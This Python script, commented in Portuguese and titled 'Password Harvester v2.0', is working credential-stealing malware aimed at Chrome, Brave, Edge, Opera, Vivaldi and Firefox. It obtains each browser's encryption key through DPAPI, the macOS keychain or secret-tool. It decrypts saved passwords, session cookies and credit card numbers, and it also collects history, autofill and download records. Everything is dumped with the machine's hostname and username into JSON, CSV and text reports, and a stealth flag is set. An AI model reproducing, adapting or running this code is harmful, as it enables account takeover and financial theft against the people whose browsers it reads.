#!/usr/bin/env python3
"""
Password Harvester v2.0 - Sistema de Extracao de Credenciais
Extrai senhas salvas, cookies, historico e dados de autofill
Suporta: Chrome, Brave, Edge, Opera, Vivaldi, Firefox

Autor: Jarvis | Mestre: Ibatle
Data: 2026-06-05
"""

import os
import sys
import json
import csv
import sqlite3
import shutil
import base64
import tempfile
import subprocess
import struct
import zlib
import random
import string
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
from threading import Thread

# ============================================================================
# CONFIGURACAO
# ============================================================================
OUTPUT_DIR = "outputs"
MAX_HISTORY = 500
MAX_COOKIES = 1000
STEALTH_MODE = True

# ============================================================================
# BANNER
# ============================================================================
BANNER = r"""
    ____                          __               __
   / __ \____  ___  ________     / /_  ____ ______/ /_____  _____
  / /_/ / __ \/ _ \/ ___/ _ \   / __ \/ __ `/ ___/ //_/ _ \/ ___/
 / ____/ /_/ /  __/ /  /  __/  / / / / /_/ / /__/ ,< /  __/ /
/_/    \____/\___/_/   \___/  /_/ /_/\__,_/\___/_/|_|\___/_/

          [ Sistema de Extracao de Credenciais v2.0 ]
                    [ Jarvis | Mestre Ibatle ]
"""

# ============================================================================
# NAVEGADORES SUPORTADOS
# ============================================================================
BROWSERS = {
    "chrome": {
        "name": "Google Chrome",
        "paths": {
            "win":  ["Google", "Chrome", "User Data"],
            "darwin": ["Google", "Chrome"],
            "linux":  ["google-chrome"],
        },
    },
    "brave": {
        "name": "Brave Browser",
        "paths": {
            "win":  ["BraveSoftware", "Brave-Browser", "User Data"],
            "darwin": ["BraveSoftware", "Brave-Browser"],
            "linux":  ["BraveSoftware", "Brave-Browser"],
        },
    },
    "edge": {
        "name": "Microsoft Edge",
        "paths": {
            "win":  ["Microsoft", "Edge", "User Data"],
            "darwin": ["Microsoft Edge"],
            "linux":  ["microsoft-edge"],
        },
    },
    "opera": {
        "name": "Opera",
        "paths": {
            "win":  ["Opera Software", "Opera Stable"],
            "darwin": ["com.operasoftware.Opera"],
            "linux":  ["opera"],
        },
    },
    "vivaldi": {
        "name": "Vivaldi",
        "paths": {
            "win":  ["Vivaldi", "User Data"],
            "darwin": ["Vivaldi"],
            "linux":  ["vivaldi"],
        },
    },
    "firefox": {
        "name": "Mozilla Firefox",
        "paths": {
            "win":  ["Mozilla", "Firefox"],
            "darwin": ["Firefox"],
            "linux":  [".mozilla", "firefox"],
        },
        "is_firefox": True,
    },
}

# ============================================================================
# FUNCOES UTILITARIAS
# ============================================================================

def get_platform():
    """Detecta a plataforma atual"""
    if sys.platform == "win32":
        return "win"
    elif sys.platform == "darwin":
        return "darwin"
    return "linux"


def get_user_data_dir():
    """Retorna o diretorio base de dados do usuario"""
    platform = get_platform()
    if platform == "win":
        return os.environ.get("LOCALAPPDATA", "")
    elif platform == "darwin":
        return os.path.join(os.path.expanduser("~"), "Library", "Application Support")
    return os.path.join(os.path.expanduser("~"), ".config")


def get_app_data_dir():
    """Retorna o diretorio AppData (Windows) ou equivalente"""
    platform = get_platform()
    if platform == "win":
        return os.environ.get("APPDATA", "")
    elif platform == "darwin":
        return os.path.join(os.path.expanduser("~"), "Library", "Application Support")
    return os.path.join(os.path.expanduser("~"), ".config")


def build_path(parts):
    """Constroi um path a partir de partes"""
    return os.path.join(*parts)


def safe_remove(path):
    """Remove arquivo de forma segura"""
    try:
        if os.path.exists(path):
            os.remove(path)
    except:
        pass


def copy_db_to_temp(db_path, prefix="harvest"):
    """Copia banco de dados SQLite para temp para evitar lock"""
    if not db_path or not os.path.exists(db_path):
        return None
    try:
        temp_path = os.path.join(tempfile.gettempdir(), f"{prefix}_{os.path.basename(db_path)}_{int(time.time())}")
        shutil.copy2(db_path, temp_path)
        return temp_path
    except:
        return None


def query_sqlite(db_path, query, params=None):
    """Executa query em SQLite e retorna resultados"""
    if not db_path or not os.path.exists(db_path):
        return []
    temp_db = copy_db_to_temp(db_path)
    if not temp_db:
        return []
    results = []
    try:
        conn = sqlite3.connect(temp_db)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        if params:
            cursor.execute(query, params)
        else:
            cursor.execute(query)
        results = [dict(row) for row in cursor.fetchall()]
        conn.close()
    except Exception as e:
        pass
    finally:
        safe_remove(temp_db)
    return results


def timestamp_to_datetime(ts):
    """Converte timestamp do Chromium para datetime"""
    if not ts:
        return None
    try:
        # Chromium usa microsegundos desde 1601-01-01
        if ts > 10000000000000000:
            return datetime.fromtimestamp((ts - 11644473600000000) / 1000000)
        return datetime.fromtimestamp(ts)
    except:
        return None


def format_timestamp(ts):
    """Formata timestamp para string legivel"""
    dt = timestamp_to_datetime(ts)
    if dt:
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    return ""

# ============================================================================
# CRIPTOGRAFIA - CHAVES DOS NAVEGADORES
# ============================================================================

def get_chromium_key():
    """Obtem a chave de criptografia do Chromium para a plataforma atual"""
    platform = get_platform()
    if platform == "win":
        return get_chromium_key_windows()
    elif platform == "darwin":
        return get_chromium_key_macos()
    return get_chromium_key_linux()


def get_chromium_key_linux():
    """Obtem a chave de criptografia do Chromium no Linux"""
    try:
        result = subprocess.run(
            ["secret-tool", "search", "application", "chrome"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return result.stdout.strip().encode()
    except:
        pass

    # Tenta ler do Local State
    state_paths = [
        build_path([get_user_data_dir(), "google-chrome", "Local State"]),
        build_path([get_user_data_dir(), "BraveSoftware", "Brave-Browser", "Local State"]),
        build_path([get_user_data_dir(), "microsoft-edge", "Local State"]),
    ]
    for state_path in state_paths:
        if os.path.exists(state_path):
            try:
                with open(state_path, "r", encoding="utf-8") as f:
                    state = json.load(f)
                encrypted_key = state.get("os_crypt", {}).get("encrypted_key", "")
                if encrypted_key:
                    key_data = base64.b64decode(encrypted_key)
                    if key_data.startswith(b"DPAPI"):
                        key_data = key_data[5:]
                    return key_data
            except:
                pass
    return None


def get_chromium_key_windows():
    """Obtem a chave de criptografia do Chromium no Windows via DPAPI"""
    try:
        import ctypes
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD), ("pbData", wintypes.LPBYTE)]

        local_state_paths = [
            build_path([get_user_data_dir(), "Google", "Chrome", "User Data", "Local State"]),
            build_path([get_user_data_dir(), "BraveSoftware", "Brave-Browser", "User Data", "Local State"]),
            build_path([get_user_data_dir(), "Microsoft", "Edge", "User Data", "Local State"]),
        ]

        for local_state_path in local_state_paths:
            if os.path.exists(local_state_path):
                with open(local_state_path, "r", encoding="utf-8") as f:
                    state = json.load(f)
                encrypted_key = state.get("os_crypt", {}).get("encrypted_key", "")
                if encrypted_key:
                    key_data = base64.b64decode(encrypted_key)
                    if key_data.startswith(b"DPAPI"):
                        key_data = key_data[5:]
                    blob_in = DATA_BLOB(len(key_data), ctypes.cast(key_data, wintypes.LPBYTE))
                    blob_out = DATA_BLOB()
                    ctypes.windll.crypt32.CryptUnprotectData(
                        ctypes.byref(blob_in), None, None, None, None, 0,
                        ctypes.byref(blob_out)
                    )
                    decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return decrypted
    except:
        pass
    return None


def get_chromium_key_macos():
    """Obtem a chave de criptografia do Chromium no macOS"""
    try:
        result = subprocess.run(
            ["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return result.stdout.strip().encode()
    except:
        pass
    return None


def decrypt_chromium_password(encrypted_data, key=None):
    """Decripta senha do Chromium usando AES-256-GCM"""
    if not encrypted_data or len(encrypted_data) < 3:
        return ""
    if key is None:
        return "[encrypted - no key]"

    try:
        if encrypted_data.startswith(b"v10") or encrypted_data.startswith(b"v11"):
            encrypted_data = encrypted_data[3:]
        if len(encrypted_data) < 12:
            return "[encrypted - invalid]"

        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]

        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
            return plaintext.decode("utf-8")
        except ImportError:
            return "[encrypted - install cryptography library]"
    except:
        pass
    return "[encrypted]"


def attempt_decrypt(encrypted_data):
    """Tenta decriptar dados criptografados"""
    if not encrypted_data:
        return ""
    if encrypted_data.startswith(b"v10") or encrypted_data.startswith(b"v11"):
        key = get_chromium_key()
        if key:
            return decrypt_chromium_password(encrypted_data, key)
        return "[encrypted - needs key]"
    try:
        text = encrypted_data.decode("utf-8")
        if text.isprintable():
            return text
    except:
        pass
    return "[encrypted]"

# ============================================================================
# DETECCAO DE NAVEGADORES
# ============================================================================

def get_browser_base_dir(browser_key, platform):
    """Retorna diretorio base do navegador"""
    browser = BROWSERS[browser_key]
    if browser.get("is_firefox"):
        return None
    paths = browser["paths"].get(platform, browser["paths"].get("linux", []))
    if platform == "win":
        return build_path([get_user_data_dir()] + paths)
    elif platform == "darwin":
        return build_path([get_user_data_dir()] + paths)
    return build_path([get_user_data_dir()] + paths)


def get_all_chromium_profiles(browser_key, platform):
    """Retorna todos os perfis do navegador"""
    base_dir = get_browser_base_dir(browser_key, platform)
    if not base_dir or not os.path.exists(base_dir):
        return []

    profiles = []
    try:
        for item in os.listdir(base_dir):
            item_path = os.path.join(base_dir, item)
            if not os.path.isdir(item_path):
                continue
            login_data = os.path.join(item_path, "Login Data")
            if os.path.exists(login_data):
                profiles.append({
                    "name": item,
                    "path": login_data,
                    "cookies": os.path.join(item_path, "Network", "Cookies") if os.path.exists(os.path.join(item_path, "Network", "Cookies")) else os.path.join(item_path, "Cookies"),
                    "history": os.path.join(item_path, "History"),
                    "web_data": os.path.join(item_path, "Web Data"),
                })
    except:
        pass
    return profiles


def get_firefox_profiles():
    """Retorna lista de perfis do Firefox"""
    platform = get_platform()
    if platform == "win":
        base = build_path([get_app_data_dir(), "Mozilla", "Firefox", "Profiles"])
    elif platform == "darwin":
        base = build_path([os.path.expanduser("~"), "Library", "Application Support", "Firefox", "Profiles"])
    else:
        base = build_path([os.path.expanduser("~"), ".mozilla", "firefox"])

    if not os.path.exists(base):
        return []

    profiles = []
    try:
        for item in os.listdir(base):
            item_path = os.path.join(base, item)
            if os.path.isdir(item_path) and (".default" in item or "default" in item):
                logins_file = os.path.join(item_path, "logins.json")
                if os.path.exists(logins_file):
                    profiles.append({
                        "name": item,
                        "path": item_path,
                        "logins": logins_file,
                    })
    except:
        pass
    return profiles

# ============================================================================
# EXTRACAO DE DADOS
# ============================================================================

def extract_chromium_logins(db_path):
    """Extrai credenciais de banco Chromium"""
    results = []
    if not db_path or not os.path.exists(db_path):
        return results

    rows = query_sqlite(db_path, """
        SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used, times_used
        FROM logins
        WHERE username_value != ''
        ORDER BY date_last_used DESC
    """)

    for row in rows:
        password_encrypted = row.get("password_value", b"")
        if isinstance(password_encrypted, str):
            password_encrypted = password_encrypted.encode("latin-1")

        password = attempt_decrypt(password_encrypted)

        results.append({
            "url": row.get("origin_url", ""),
            "action_url": row.get("action_url", ""),
            "username": row.get("username_value", ""),
            "password": password,
            "created": format_timestamp(row.get("date_created")),
            "last_used": format_timestamp(row.get("date_last_used")),
            "times_used": row.get("times_used", 0),
        })

    return results


def extract_chromium_cookies(cookies_path):
    """Extrai cookies de banco Chromium"""
    results = []
    if not cookies_path or not os.path.exists(cookies_path):
        return results

    rows = query_sqlite(cookies_path, """
        SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, is_session, creation_utc
        FROM cookies
        ORDER BY host_key
        LIMIT ?
    """, (MAX_COOKIES,))

    for row in rows:
        value = row.get("value", "")
        if not value:
            enc_value = row.get("encrypted_value", b"")
            if isinstance(enc_value, str):
                enc_value = enc_value.encode("latin-1")
            value = attempt_decrypt(enc_value)

        results.append({
            "host": row.get("host_key", ""),
            "name": row.get("name", ""),
            "value": value,
            "path": row.get("path", ""),
            "expires": format_timestamp(row.get("expires_utc")),
            "secure": bool(row.get("is_secure", 0)),
            "httponly": bool(row.get("is_httponly", 0)),
            "session": bool(row.get("is_session", 0)),
        })

    return results


def extract_chromium_history(history_path):
    """Extrai historico de navegacao"""
    results = []
    if not history_path or not os.path.exists(history_path):
        return results

    rows = query_sqlite(history_path, """
        SELECT url, title, visit_count, last_visit_time, typed_count
        FROM urls
        ORDER BY last_visit_time DESC
        LIMIT ?
    """, (MAX_HISTORY,))

    for row in rows:
        results.append({
            "url": row.get("url", ""),
            "title": row.get("title", ""),
            "visits": row.get("visit_count", 0),
            "typed": row.get("typed_count", 0),
            "last_visit": format_timestamp(row.get("last_visit_time")),
        })

    return results


def extract_chromium_autofill(web_data_path):
    """Extrai dados de autofill (enderecos, cartoes, etc.)"""
    results = []
    if not web_data_path or not os.path.exists(web_data_path):
        return results

    # Autofill (enderecos, formularios)
    rows = query_sqlite(web_data_path, """
        SELECT name, value, value_lower, date_created
        FROM autofill
        WHERE value != ''
        ORDER BY date_created DESC
    """)
    for row in rows:
        results.append({
            "type": "autofill",
            "field": row.get("name", ""),
            "value": row.get("value", ""),
            "created": format_timestamp(row.get("date_created")),
        })

    # Cartoes de credito
    rows = query_sqlite(web_data_path, """
        SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted
        FROM credit_cards
    """)
    for row in rows:
        card_enc = row.get("card_number_encrypted", b"")
        if isinstance(card_enc, str):
            card_enc = card_enc.encode("latin-1")
        card = attempt_decrypt(card_enc)
        results.append({
            "type": "credit_card",
            "name": row.get("name_on_card", ""),
            "exp_month": row.get("expiration_month", ""),
            "exp_year": row.get("expiration_year", ""),
            "card": card,
        })

    return results


def extract_chromium_downloads(history_path):
    """Extrai historico de downloads"""
    results = []
    if not history_path or not os.path.exists(history_path):
        return results

    rows = query_sqlite(history_path, """
        SELECT target_path, tab_url, total_bytes, start_time, end_time
        FROM downloads
        ORDER BY start_time DESC
        LIMIT 100
    """)
    for row in rows:
        results.append({
            "path": row.get("target_path", ""),
            "url": row.get("tab_url", ""),
            "size": row.get("total_bytes", 0),
            "start": format_timestamp(row.get("start_time")),
            "end": format_timestamp(row.get("end_time")),
        })

    return results


def extract_firefox_logins(profile_path, logins_file):
    """Extrai credenciais do Firefox"""
    results = []
    if not os.path.exists(logins_file):
        return results

    try:
        with open(logins_file, "r", encoding="utf-8") as f:
            data = json.load(f)

        logins = data.get("logins", [])
        for login in logins:
            results.append({
                "url": login.get("hostname", ""),
                "username": "[encrypted]",
                "password": "[encrypted]",
                "created": "",
                "last_used": "",
                "times_used": 0,
            })
    except:
        pass

    return results

# ============================================================================
# HARVEST COMPLETO
# ============================================================================

def harvest_browser(browser_key, platform):
    """Executa harvest em um navegador especifico"""
    browser_info = BROWSERS[browser_key]
    results = {
        "browser": browser_info["name"],
        "profiles": [],
    }

    if browser_info.get("is_firefox"):
        profiles = get_firefox_profiles()
        for profile in profiles:
            logins = extract_firefox_logins(profile["path"], profile["logins"])
            results["profiles"].append({
                "name": profile["name"],
                "logins": logins,
            })
    else:
        profiles = get_all_chromium_profiles(browser_key, platform)
        for profile in profiles:
            logins = extract_chromium_logins(profile["path"])
            cookies = extract_chromium_cookies(profile["cookies"])
            history = extract_chromium_history(profile["history"])
            autofill = extract_chromium_autofill(profile["web_data"])
            downloads = extract_chromium_downloads(profile["history"])

            results["profiles"].append({
                "name": profile["name"],
                "logins": logins,
                "cookies": cookies,
                "history": history,
                "autofill": autofill,
                "downloads": downloads,
            })

    return results


def harvest_all():
    """Executa harvest completo em todos os navegadores"""
    print(BANNER)
    print(f"\n[*] Iniciando extracao de credenciais...")
    print(f"[*] Plataforma: {get_platform().upper()}")
    print(f"[*] Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 70)

    platform = get_platform()
    all_data = {
        "timestamp": datetime.now().isoformat(),
        "platform": platform,
        "hostname": os.environ.get("COMPUTERNAME", os.environ.get("HOSTNAME", "unknown")),
        "user": os.environ.get("USERNAME", os.environ.get("USER", "unknown")),
        "browsers": [],
    }

    for browser_key in ["chrome", "brave", "edge", "opera", "vivaldi", "firefox"]:
        browser_info = BROWSERS[browser_key]
        try:
            data = harvest_browser(browser_key, platform)
            if data["profiles"]:
                total_logins = sum(len(p.get("logins", [])) for p in data["profiles"])
                total_cookies = sum(len(p.get("cookies", [])) for p in data["profiles"])
                total_history = sum(len(p.get("history", [])) for p in data["profiles"])
                total_autofill = sum(len(p.get("autofill", [])) for p in data["profiles"])
                print(f"\n[+] {browser_info['name']} - {len(data['profiles'])} perfil(s)")
                print(f"    |-> Logins: {total_logins}")
                print(f"    |-> Cookies: {total_cookies}")
                print(f"    |-> History: {total_history}")
                print(f"    |-> Autofill: {total_autofill}")
                all_data["browsers"].append(data)
        except Exception as e:
            print(f"\n[-] Erro em {browser_info['name']}: {str(e)}")

    # Summary
    total_logins = sum(
        sum(len(p.get("logins", [])) for p in b.get("profiles", []))
        for b in all_data["browsers"]
    )
    total_cookies = sum(
        sum(len(p.get("cookies", [])) for p in b.get("profiles", []))
        for b in all_data["browsers"]
    )
    total_history = sum(
        sum(len(p.get("history", [])) for p in b.get("profiles", []))
        for b in all_data["browsers"]
    )

    print("\n" + "=" * 70)
    print("[*] RESUMO DA EXTRACAO")
    print("=" * 70)
    print(f"    Navegadores encontrados: {len(all_data['browsers'])}")
    print(f"    Credenciais (logins): {total_logins}")
    print(f"    Cookies: {total_cookies}")
    print(f"    URLs (historico): {total_history}")
    print("=" * 70)

    return all_data

# ============================================================================
# SALVAMENTO DE RESULTADOS
# ============================================================================

def save_results(data, output_dir=OUTPUT_DIR):
    """Salva resultados em multiplos formatos"""
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_name = f"harvest_{timestamp}"

    # JSON completo
    json_path = os.path.join(output_dir, f"{base_name}.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    print(f"\n[+] JSON completo: {json_path}")

    # CSV - Logins
    all_logins = []
    for browser in data.get("browsers", []):
        for profile in browser.get("profiles", []):
            for login in profile.get("logins", []):
                login["browser"] = browser["browser"]
                login["profile"] = profile["name"]
                all_logins.append(login)

    if all_logins:
        csv_path = os.path.join(output_dir, f"{base_name}_logins.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=[
                "browser", "profile", "url", "username", "password",
                "created", "last_used", "times_used"
            ])
            writer.writeheader()
            for login in all_logins:
                writer.writerow(login)
        print(f"[+] CSV logins: {csv_path}")

    # CSV - Cookies
    all_cookies = []
    for browser in data.get("browsers", []):
        for profile in browser.get("profiles", []):
            for cookie in profile.get("cookies", []):
                cookie["browser"] = browser["browser"]
                cookie["profile"] = profile["name"]
                all_cookies.append(cookie)

    if all_cookies:
        csv_path = os.path.join(output_dir, f"{base_name}_cookies.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=[
                "browser", "profile", "host", "name", "value", "path",
                "expires", "secure", "httponly", "session"
            ])
            writer.writeheader()
            for cookie in all_cookies:
                writer.writerow(cookie)
        print(f"[+] CSV cookies: {csv_path}")

    # Relatorio TXT
    txt_path = os.path.join(output_dir, f"{base_name}_report.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("=" * 70 + "\n")
        f.write("SISTEMA DE EXTRACAO DE CREDENCIAIS - RELATORIO\n")
        f.write("=" * 70 + "\n")
        f.write(f"Timestamp: {data['timestamp']}\n")
        f.write(f"Plataforma: {data['platform']}\n")
        f.write(f"Hostname: {data['hostname']}\n")
        f.write(f"Usuario: {data['user']}\n")
        f.write("=" * 70 + "\n\n")

        for browser in data.get("browsers", []):
            f.write(f"\n{'='*70}\n")
            f.write(f"NAVEGADOR: {browser['browser']}\n")
            f.write(f"{'='*70}\n")

            for profile in browser.get("profiles", []):
                f.write(f"\n--- Perfil: {profile['name']} ---\n\n")

                logins = profile.get("logins", [])
                if logins:
                    f.write(f"[CREDENCIAIS] ({len(logins)} encontradas)\n")
                    f.write("-" * 70 + "\n")
                    for cred in logins:
                        f.write(f"URL: {cred.get('url', 'N/A')}\n")
                        f.write(f"Usuario: {cred.get('username', 'N/A')}\n")
                        f.write(f"Senha: {cred.get('password', 'N/A')}\n")
                        f.write(f"Criado: {cred.get('created', 'N/A')}\n")
                        f.write(f"Ultimo uso: {cred.get('last_used', 'N/A')}\n")
                        f.write("-" * 70 + "\n")

    print(f"[+] TXT relatorio: {txt_path}")
    return json_path, txt_path

# ============================================================================
# MAIN
# ============================================================================

def main():
    data = harvest_all()
    if data["browsers"]:
        save_results(data)
        print("\n[*] Extracao concluida com sucesso!")
    else:
        print("\n[-] Nenhum navegador encontrado ou dados vazios.")
    return data


if __name__ == "__main__":
    main()
